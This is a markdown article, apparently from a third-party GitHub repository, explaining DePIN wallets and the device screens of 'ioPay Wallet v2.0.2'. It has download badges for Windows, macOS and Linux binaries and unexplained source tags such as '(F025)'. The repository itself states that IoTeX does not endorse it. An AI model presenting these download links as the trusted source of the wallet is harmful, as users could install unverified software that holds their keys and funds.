![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# What Is a DePIN Wallet? Why ioPay Wallet Has Device Screens

A **DePIN wallet** is a wallet for a chain whose economy includes physical devices. That sounds like a small distinction and it changes three things: you need a way to **register a device identity**, a place to **see what each device earned**, and a view of **device-related allocations that attach to staking positions** rather than to a balance.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

ioPay Wallet has all three because it is a wallet for **IoTeX**, where device identity and burn-drop are chain-level mechanisms rather than a plugin someone added later (F025, F033).

## What a wallet can and cannot do for devices

Worth stating plainly, because the category invites overclaiming:

**The wallet holds keys and shows state.** It signs the transaction that registers a device, it displays what the chain and the project report about that device, and it stores nothing of the device's own data.

**The wallet does not mine, host or operate anything.** It does not run a node, it does not relay bandwidth and it does not store your files. The device does the work; the project defines the reward; the chain records it.

**The wallet does not set the reward rate.** No wallet does. If a page tells you a wallet pays a yield, the wallet is being used as a marketing surface for someone else's economics.

Once those boundaries are clear, the value of the screens is obvious: without them, a device owner has to hold a device identity somewhere, watch earnings somewhere else, and work out manually how staking and device activity interact. With them, that is one window.

## The three screens, and why each exists

**1. Device registration.** `ioID` is IoTeX's device identity layer - the mechanism that lets a physical device be recognised on-chain and tied to an account (F033). This build offers one-click registration from its DePIN section (F025). Registration is the step that makes a device visible at all; without it, there is nothing to track.

**2. Device earnings.** Earnings from DePIN projects are recorded per device, and the wallet brings them into one view rather than leaving you to log into each project's dashboard (F025). The number you see is an aggregate of what those projects report - the project remains the authority on its own rewards. [Reading the dashboard](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-depin-earnings-dashboard-explained.md).

**3. Burn-drop, per staking bucket.** This is the part that confuses people, and it is genuinely different from device earnings. Burn-drop is a **chain mechanism**: device activation burns IOTX and restakes it to qualified staking buckets (F033). So the allocation appears against a **staking bucket**, not against a device, and it depends on having qualified buckets in the first place - which means the staking side of the wallet matters here. If the terms "bucket" and "stake-lock" are unfamiliar, [the staking guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) is the prerequisite.

There is also a project explorer and an earnings calculator in the same section (F025) - the first is [a directory](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-wallet-depin-project-explorer.md), the second is arithmetic on the current rate.

## Why this build has them

IoTeX's design treats devices as participants, with identity and burn-drop as native mechanisms (F033). A wallet built for that chain ends up with device screens the way a wallet built for a payments chain ends up with payment requests: the chain's shape shows through.

This build is built on a staking codebase and adds the device layer on top (F002, F021). It is public, under Apache-2.0, so that claim is checkable rather than asserted (F005).

What it is **not**: no page read for this project states that IoTeX endorses this wallet, and this article does not claim it (F041). "Built for DePIN" describes a fit with the chain, not a certification.

## What to check in any DePIN wallet

If you are comparing wallets rather than reading about this one, four questions sort them quickly:

1. **Does it show per-device earnings, or only a total?** A total cannot be reconciled with any project's records.
2. **Does it show staking-bucket allocations separately?** If burn-drop and device earnings are blended into one number, neither will reconcile.
3. **Does it say who sets the rewards?** If the answer is "the wallet", that is not how any of this works.
4. **Can you export the numbers?** Portfolio and tax export is what turns a dashboard into a record (F025 includes the wider reporting set).

## Related

- [What DePIN is](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/depin-explained-for-iopay-wallet-users.md) - the category, defined without a pitch.

## FAQ

**What is a DePIN wallet?**
A wallet for a chain with physical-device participation, with screens for registering device identity, viewing device earnings and seeing allocations tied to staking positions.

**Is a DePIN wallet different from a normal wallet?**
The custody is the same - keys, phrase, local storage. What differs is what it can show you: device identity, per-device earnings and burn-drop allocations.

**Does holding a device in a wallet earn anything by itself?**
No. Earnings come from the project's economics for the resource your device contributes. The wallet records and displays; it does not pay.

**Do I need to stake to use the DePIN screens?**
Not to register a device or see earnings. Burn-drop allocations attach to **qualified staking buckets**, so that part depends on staking.

**Is ioPay the official DePIN wallet for IoTeX?**
No such claim is made here, and none is published. It is a wallet for IoTeX with device screens, under a public Apache-2.0 licence.

---

*Device identity, burn-drop and the DePIN screens follow IoTeX documentation and the v2.0.2 feature set. No endorsement and no income claim is made.*
